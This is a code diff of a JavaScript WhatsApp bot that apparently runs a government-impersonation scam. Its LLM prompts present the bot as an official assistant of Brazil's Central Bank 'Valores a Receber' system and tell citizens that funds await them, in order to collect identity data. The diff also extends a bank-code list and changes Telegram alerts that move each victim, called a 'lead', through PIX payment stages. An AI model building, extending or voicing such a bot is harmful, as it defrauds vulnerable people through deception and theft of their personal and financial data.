@@ -45,22 +45,34 @@ const PROMPT_INICIAL = `Você é o Assistente Oficial do Portal SVR — Sistema 
 Este canal é de uso exclusivo para liberação de ativos financeiros pendentes de titulares cadastrados no sistema federal.
 Um cidadão entrou em contato. Responda de forma extremamente formal, institucional e segura, como um assistente de órgão público federal. 
 Informe brevemente que identificou valores a receber cadastrados em nome do titular no sistema e que é necessário validar a identidade para prosseguir com a liberação. Não mencione valores específicos. Seja sóbrio, preciso e formal.
+
+⚠️ *IMPORTANTE:* Use apenas um asterisco (*) para negrito (ex: *texto*). NUNCA use dois asteriscos (**), pois o WhatsApp não reconhece e polui a mensagem.
+
 Mensagem do cidadão:`;
 
 // Prompt para validação de data inválida
 const PROMPT_DATA_INVALIDA = `Você é o Assistente Oficial do Portal SVR — Sistema de Valores a Receber, vinculado ao Banco Central do Brasil e em conformidade com o STJ.
 O cidadão enviou uma mensagem que não corresponde a uma data de nascimento válida. Solicite novamente de forma formal e institucional, no formato DD/MM/AAAA.
+
+⚠️ *IMPORTANTE:* Use apenas um asterisco (*) para negrito (ex: *texto*). NUNCA use dois asteriscos (**).
+
 Mensagem do cidadão:`;
 
 // Prompt para validação de nome inválido
 const PROMPT_NOME_INVALIDO = `Você é o Assistente Oficial do Portal SVR — Sistema de Valores a Receber, vinculado ao Banco Central do Brasil e em conformidade com o STJ.
 O cidadão enviou algo que não parece ser um nome completo válido. Solicite que informe o nome completo conforme consta em documento oficial, de forma formal e institucional.
+
+⚠️ *IMPORTANTE:* Use apenas um asterisco (*) para negrito (ex: *texto*). NUNCA use dois asteriscos (**).
+
 Mensagem do cidadão:`;
 
 // Prompt para mensagens durante a fila de espera
 const PROMPT_FILA = `Você é o Assistente Oficial do Portal SVR — Sistema de Valores a Receber, vinculado ao Banco Central do Brasil, em conformidade com as diretrizes do Superior Tribunal de Justiça (STJ).
 O cidadão está aguardando na fila de processamento para liberação de seus ativos financeiros. O registro dele já foi validado com sucesso e está em análise pelos sistemas do Banco Central.
 Responda de forma formal, institucional e tranquilizadora, informando que o processo está em andamento e que ele será notificado assim que a liberação for processada. Solicite que aguarde. Não mencione valores. Seja sóbrio e oficial.
+
+⚠️ *IMPORTANTE:* Use apenas um asterisco (*) para negrito (ex: *texto*). NUNCA use dois asteriscos (**), pois o WhatsApp não reconhece e polui a mensagem.
+
 Mensagem do cidadão durante a espera:`;
 
 async function askAI(prompt, userMessage) {
@@ -418,38 +430,51 @@ O senhor(a) receberá uma notificação via SMS ou e-mail assim que o valor esti
 _Processo 100% Homologado e Finalizado._`;
 
 const BANCOS_LIST = {
-    "001": "Banco do Brasil",
-    "003": "Banco da Amazônia",
-    "004": "Banco do Nordeste",
-    "033": "Santander",
-    "077": "Banco Inter",
-    "104": "Caixa Econômica",
-    "197": "Stone",
-    "212": "Banco Original",
-    "237": "Bradesco",
-    "260": "Nubank",
-    "290": "PagBank",
-    "336": "C6 Bank",
-    "341": "Itaú",
-    "389": "Banco Mercantil",
-    "403": "Cora",
-    "633": "Banco Rendimento",
-    "652": "Itaú Holding",
-    "745": "Citibank",
-    "748": "Sicredi",
-    "756": "Sicoob",
-    "025": "Banco Alfa",
-    "029": "Itaú Consignado",
-    "036": "Bradesco BBI",
-    "037": "Banpará",
-    "047": "Banese",
-    "065": "Andbank",
-    "121": "Agibank",
-    "218": "Banco BS2",
-    "318": "Banco BMG",
-    "368": "Banco CSF (Carrefour)",
-    "739": "Banco Cetelem",
-    "752": "BNP Paribas"
+    "001": "Banco do Brasil", "003": "Banco da Amazônia", "004": "Banco do Nordeste", "007": "BNDES", "010": "Credicoamo",
+    "011": "Credit Suisse HG", "012": "Banco Inbursa", "017": "Bny Mellon", "021": "Banestes", "024": "Banco Bandepe",
+    "025": "Banco Alfa", "029": "Itaú Consignado", "033": "Santander", "036": "Bradesco BBI", "037": "Banpará",
+    "041": "Banrisul", "047": "Banese", "060": "Confidence Corretora", "062": "Hipercard", "063": "Bradescard",
+    "064": "Goldman Sachs", "065": "Banco Andbank", "066": "Morgan Stanley", "069": "Crefisa", "070": "BRB - Banco de Brasília",
+    "074": "Banco J. Safra", "075": "Banco ABN AMRO", "076": "Banco KDB", "077": "Banco Inter", "078": "Haitong Banco",
+    "079": "Banco Original Agro", "080": "B&T Corretora", "081": "Bancoseguro", "082": "Banco Topázio", "083": "Banco da China Brasil",
+    "084": "Uniprime Norte PR", "085": "Ailos", "088": "Banco Randon", "089": "Credisan", "091": "Central RS",
+    "092": "BRK S.A. Crédito", "094": "Banco Finaxis", "096": "Banco B3", "097": "Credisis", "098": "Credialiança",
+    "099": "Uniprime Central", "100": "Planner Corretora", "101": "Renascença DTVM", "102": "XP Investimentos",
+    "104": "Caixa Econômica Federal", "105": "Lecca Crédito", "107": "Banco Bocom BBM", "108": "Portocred S.A.", "111": "Oliveira Trust",
+    "113": "Magliano S.A.", "114": "Cecoop", "117": "Advanced Corretora", "119": "Western Union", "120": "Banco Rodobens",
+    "121": "Banco Agibank", "122": "Bradesco Berj", "124": "Woori Bank", "125": "Plural S.A.", "126": "BR Partners",
+    "127": "Codepe Corretora", "128": "MS Bank", "129": "UBS Brasil", "130": "Caruana S.A.", "131": "Tullett Prebon",
+    "132": "ICBC do Brasil", "133": "Cresol", "134": "BGC Liquidez", "136": "Unicred do Brasil", "138": "Get Money Corretora",
+    "139": "Intesa Sanpaolo", "140": "Easynvest", "142": "Broker Brasil Corretora", "143": "Treviso Corretora", "144": "Bexs Banco",
+    "145": "Levycam", "146": "Guitta Corretora", "149": "Facta Financeira", "157": "ICAP do Brasil", "159": "Casa do Crédito",
+    "163": "Commerzbank Brasil", "169": "Banco Olé Consignado", "173": "BRL Trust", "174": "Pefisa S.A.", "177": "Guide Investimentos",
+    "180": "CM Capital Markets", "183": "Socred S.A.", "184": "Banco Itaú BBA", "188": "Ativa Investimentos", "189": "HS Financeira",
+    "191": "Nova Futura", "194": "Parmetal DTVM", "196": "Fair Corretora", "197": "Stone Pagamentos", "208": "Banco BTG Pactual",
+    "212": "Banco Original", "213": "Banco Arbi", "217": "Banco John Deere", "218": "Banco BS2", "222": "Crédit Agricole",
+    "224": "Banco Fibra", "233": "Banco Cetelem", "237": "Banco Bradesco", "241": "Banco Clássico", "243": "Banco Máxima",
+    "246": "Banco ABC Brasil", "249": "Investcred Unibanco", "250": "BCV - Crédito e Varejo", "253": "Bexs Corretora", "254": "Paraná Banco",
+    "259": "Moneycorp Banco", "260": "Nubank", "265": "Banco Fator", "266": "Banco Cédula", "268": "Bari Cia Hipotecária",
+    "269": "Banco HSBC", "271": "IB Corretora", "272": "AGK Corretora", "274": "Money Plus", "278": "Genial Investimentos",
+    "280": "Avista S.A.", "281": "Coopavel", "285": "Frente Corretora", "286": "Sulcredi/Ouro", "288": "Carol DTVM",
+    "289": "Decyseo Corretora", "290": "PagBank", "292": "BS2 DTVM", "293": "Lastro RDV", "299": "Sorocred",
+    "300": "Banco de la Nacion Argentina", "301": "BPP Pagamentos", "306": "QI Sociedade de Crédito", "309": "Cambionet Corretora",
+    "313": "Amazônia Corretora", "315": "Pi DTVM", "318": "Banco BMG", "319": "OM DTVM", "320": "China Construction Bank",
+    "321": "Crefaz", "323": "Mercado Pago", "324": "Cartos SCD", "325": "Órama DTVM", "326": "Parati - Crédito",
+    "330": "Banco Bari", "331": "Fram Capital", "332": "Acesso Soluções", "335": "Banco Digio", "336": "Banco C6",
+    "340": "Super Pagamentos", "341": "Itaú Unibanco", "342": "Creditas SCD", "348": "Banco XP", "349": "AL5 S.A. Crédito",
+    "364": "Gerencianet (Efí)", "366": "Société Générale", "368": "Banco CSF (Carrefour)", "370": "Terra Investimentos", "376": "J.P. Morgan",
+    "380": "PicPay", "381": "Mercedes-Benz", "389": "Banco Mercantil", "390": "Banco GM", "393": "Volkswagen",
+    "394": "Bradesco Financiamentos", "396": "Hub Pagamentos", "397": "Listo SCD", "399": "Kirton Bank", "403": "Cora SCD",
+    "404": "SumUp SCD", "408": "Bónuscred SCD", "412": "Banco Capital", "422": "Banco Safra", "456": "MUFG Brasil",
+    "464": "Sumitomo Mitsui", "473": "Caixa Geral - Brasil", "477": "Citibank N.A.", "479": "Itaubank", "487": "Deutsche Bank",
+    "488": "JPMorgan Chase", "492": "ING Bank N.V.", "495": "Banco de la Provincia", "505": "Credit Suisse Brasil", "600": "Banco Luso Brasileiro",
+    "604": "Industrial do Brasil", "610": "Banco VR", "611": "Banco Paulista", "612": "Banco Guanabara", "613": "Omni Banco",
+    "623": "Banco Pan", "626": "C6 Consignado", "630": "Smartbank", "633": "Banco Rendimento", "634": "Banco Triângulo",
+    "637": "Banco Sofisa", "643": "Banco Pine", "652": "Itaú Holding", "653": "Banco Indusval", "654": "Banco Digimais",
+    "655": "Banco Votorantim", "707": "Banco Daycoval", "712": "Banco Ourinvest", "739": "Banco Cetelem", "741": "Banco Ribeirão Preto",
+    "743": "Banco Semear", "745": "Citibank S.A.", "746": "Banco Modal", "747": "Rabobank International", "748": "Sicredi",
+    "751": "Scotiabank", "752": "BNP Paribas", "753": "Novo Banco Continental", "754": "Banco Sistema", "755": "BofA Merrill Lynch",
+    "756": "Sicoob", "757": "Keb Hana do Brasil"
 };
 
 function detectBank(text) {
@@ -960,18 +985,7 @@ setInterval(async () => {
                 await notifyTelegram(
                     `🔐 <b>ETAPA 4 — PROTOCOLO ATIVO</b>\nLead: <code>${chatId}</code>\n\n<i>Aguardando detecção de validação do hash bancário.</i>`,
                     undefined,
-                    {
-                      inline_keyboard: [
-                        [
-                          { text: "🚀 Enviar ao Lead", callback_data: `pix_dest:lead:${chatId}` },
-                          { text: "📱 Enviar p/ Outro", callback_data: `pix_dest:phone:${chatId}` }
-                        ],
-                        [
-                          { text: "📋 Só Copiar (Admin)", callback_data: `pix_dest:copy:${chatId}` },
-                          { text: "❌ Cancelar", callback_data: "painel:back" }
-                        ]
-                      ]
-                    }
+                    { inline_keyboard: [[{ text: '💰 Liberar Etapa 5 Manual', callback_data: `etapa:5:${chatId}` }]] }
                 );
             } else if (etapa === 5) {
                 if (session) { session.humanStep = 5; chatSessions.set(chatId, session); saveSessions(); }
